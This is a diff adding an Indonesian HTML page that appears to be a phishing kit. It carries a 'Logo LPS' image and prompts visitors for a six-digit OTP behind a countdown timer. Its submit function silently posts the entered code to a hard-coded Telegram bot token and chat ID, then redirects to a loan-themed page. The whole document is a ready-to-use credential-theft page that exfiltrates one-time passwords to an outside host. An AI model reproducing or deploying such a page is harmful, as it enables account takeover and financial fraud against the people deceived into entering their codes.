@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>OTP Input with Timer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #ffffff;
+
+        .otp-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            margin-top: 3px;
+        }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0px;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
+
+        .otp-input {
+            display: flex;
+            align-items: center;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            padding: 0 10px;
+            color: #000000;
+            width: 330px;
+            position: relative;
+        }
+
+        .otp-input img {
+            margin-right: 5px;
+        }
+
+        .otp-input input {
+            font-size: 14px;
+            padding: 10px;
+            text-align: left; /* Agar teks OTP rata kiri */
+            border: none;
+            outline: none;
+            font-weight: bold;
+            flex: 1;
+        }
+
+        .otp-input .timer {
+            font-size: 14px;
+            color: #000000;
+            white-space: nowrap;
+            padding-left: -10%;
+            font-weight: bold;
+        }
+
+        .submit-btn {
+            background-color: #ccc;
+            color: #fff;
+            padding: 14px 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            font-size: 15px;
+            cursor: not-allowed;
+            margin-top: 15px;
+            width: 330px;
+        }
+
+        .submit-btn.enabled {
+            background-color: #1E90FF;
+            cursor: pointer;
+        }
+
+        /* Remove arrows from number input */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        input[type="tel"] {
+            -moz-appearance: textfield;
+        }
+        
+        .gambar-bawah {
+            display: flex;
+            justify-content: center;
+            position: relative;
+            bottom: -10px;
+        }
+        .gambar-bawah img {
+            width: 85%;
+            object-fit: cover;
+            margin: 0 25px;
+            background:none;
+        }
+    </style>
+</head>
+<body>
+  
+  <div class="gambar">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhcGpjhTRsmEh5E4bdfxpRvhQsglaPUt12Bq5q2Q0f0A9FtuUuA2kqY4fhR5s34HpzjXcejk6c6I7101FqjJECDqPn8Xitd8WBcDCtN4hbW2U5e7OuxaeEuer6Aj5Vo97tPWG9jcK4t7V8IKuQ6psm8gM73J4imLxpvKcydsP5ShQ0UsZxW8hIZx6cX-lsj" alt="Gambar Pucok">
+    </div>
+
+<div class="otp-container">
+    <div class="otp-input">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEiMxUamY03NSDVfWL42y4B9IQlzjPLsCJIFGwsevDZh0IJhBABiF1AvKKaK7-SfSB_OLJGpO6QOjLJqGuGjv8N8SETjiPu1qXtikur5GSA3lkQFoAb5LA3lBR1RJn3p8bpy8l1IMUp5ynamlq_IkgdUKbuSwY_YQgZwAKNtK9Smc4g70JprlIPx1qGemkQj" alt="Icon" width="24" height="24">
+        <input type="tel" id="otp" maxlength="6" pattern="\d{6}" placeholder="Masukan Kode OTP" oninput="checkOTP()">
+        <div class="timer" id="timer">120 S</div>
+    </div><br>
+    <button class="submit-btn" id="submitBtn" disabled onclick="submitOTP()">Masuk</button>
+</div>
+
+<div class="gambar gambar-bawah">
+        <img src="https://raw.githubusercontent.com/M0dalcepat/M0dalcepat.github.io/refs/heads/main/1728316757502-removebg-preview.png" alt="Logo LPS">
+    </div>
+<script>
+    let timeLeft = 120;
+    const timerElement = document.getElementById('timer');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Countdown timer
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        timerElement.textContent = timeLeft + " S";
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerElement.textContent = "Waktu Habis";
+        }
+    }, 1000);
+
+    // Function to check if OTP is filled
+    function checkOTP() {
+        const otpInput = document.getElementById('otp').value;
+        if (otpInput.length === 6 && /^\d{6}$/.test(otpInput)) {
+            submitBtn.disabled = false;
+            submitBtn.classList.add('enabled');
+            submitBtn.style.cursor = 'pointer';
+        } else {
+            submitBtn.disabled = true;
+            submitBtn.classList.remove('enabled');
+            submitBtn.style.cursor = 'not-allowed';
+        }
+    }
+
+    // Function to submit OTP and send to Telegram
+    function submitOTP() {
+        const otpInput = document.getElementById('otp').value;
+        const botToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48';  // Ganti dengan bot token Telegram Anda
+        const chatId = '6824078885';  // Ganti dengan chat ID Telegram Anda
+
+        // URL untuk mengirim pesan ke bot Telegram
+        const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Pesan yang akan dikirim
+        const message = `Kode OTP: ${otpInput}`;
+
+        // Kirim pesan ke Telegram
+        fetch(telegramURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Pesan terkirim ke Telegram:', data);
+
+            // Setelah pesan terkirim, redirect ke halaman patok.html
+            window.location.href = '/pinjaman11.html';
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
